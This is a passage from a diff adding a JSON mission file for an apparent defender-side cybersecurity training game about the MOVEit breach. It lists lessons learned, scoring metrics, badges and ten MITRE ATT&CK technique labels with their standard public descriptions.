+          "Rapid patch deployment saved organizations from extortion",
+          "IIS log monitoring detected web shells in hours vs days",
+          "Network traffic analysis identified exfiltration attempts",
+          "Forensic preservation enabled law enforcement action",
+          "Zero-day response requires pre-planned emergency procedures"
+        ],
+        "metrics": {
+          "objectivesCompleted": 3,
+          "totalObjectives": 3,
+          "timeElapsed": 2100,
+          "dataExfiltrated": "0 TB",
+          "attacksBlocked": 1
+        }
+      },
+      "rewards": {
+        "achievements": ["Zero-Day Hunter", "Emergency Responder", "Forensic Expert", "Incident Commander"],
+        "badges": ["defender-elite"]
+      }
+    }
+  ],
+
+  "mitreTechniques": [
+    {
+      "id": "T1595.002",
+      "name": "Active Scanning: Vulnerability Scanning",
+      "tactic": "Reconnaissance",
+      "description": "Adversaries may scan victims for vulnerabilities that can be used during targeting.",
+      "url": "https://attack.mitre.org/techniques/T1595/002/"
+    },
+    {
+      "id": "T1590.005",
+      "name": "Gather Victim Network Information: IP Addresses",
+      "tactic": "Reconnaissance",
+      "description": "Adversaries may gather IP addresses that can be used during targeting.",
+      "url": "https://attack.mitre.org/techniques/T1590/005/"
+    },
+    {
+      "id": "T1190",
+      "name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "description": "Adversaries may attempt to exploit a weakness in an Internet-facing application.",
+      "url": "https://attack.mitre.org/techniques/T1190/"
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "description": "Adversaries may obtain and abuse credentials of existing accounts.",
+      "url": "https://attack.mitre.org/techniques/T1078/"
+    },
+    {
+      "id": "T1505.003",
+      "name": "Server Software Component: Web Shell",
+      "tactic": "Persistence",
+      "description": "Adversaries may backdoor web servers with web shells to establish persistent access.",
+      "url": "https://attack.mitre.org/techniques/T1505/003/"
+    },
+    {
+      "id": "T1059.001",
+      "name": "Command and Scripting Interpreter: PowerShell",
+      "tactic": "Execution",
+      "description": "Adversaries may abuse PowerShell commands and scripts for execution.",
+      "url": "https://attack.mitre.org/techniques/T1059/001/"
+    },
+    {
+      "id": "T1005",
+      "name": "Data from Local System",
+      "tactic": "Collection",
+      "description": "Adversaries may search local system sources for data.",
+      "url": "https://attack.mitre.org/techniques/T1005/"
+    },
+    {
+      "id": "T1552.001",
+      "name": "Unsecured Credentials: Credentials In Files",
+      "tactic": "Credential Access",
+      "description": "Adversaries may search local file systems for files containing credentials.",
+      "url": "https://attack.mitre.org/techniques/T1552/001/"
+    },
+    {
+      "id": "T1041",
+      "name": "Exfiltration Over C2 Channel",
+      "tactic": "Exfiltration",
+      "description": "Adversaries may steal data by exfiltrating over command and control channel.",
+      "url": "https://attack.mitre.org/techniques/T1041/"
+    },
+    {
+      "id": "T1567.002",
+      "name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+      "tactic": "Exfiltration",
+      "description": "Adversaries may exfiltrate data to cloud storage services.",
+      "url": "https://attack.mitre.org/techniques/T1567/002/"
+    }
+  ],
+
+  "media": {
+    "coverImage": "/missions/moveit/cover.jpg",
+    "networkDiagrams": [
+      "/missions/moveit/network-topology.png",
+      "/missions/moveit/attack-flow.png"
+    ]
+  },
+
+  "tags": ["web", "sql-injection", "zero-day", "web-shell", "mass-exploitation", "ransomware", "data-breach", "real-world"],
+
+  "createdAt": "2025-12-14T00:00:00Z",
+  "updatedAt": "2025-12-14T00:00:00Z",
+  "version": "1.0.0"
+}
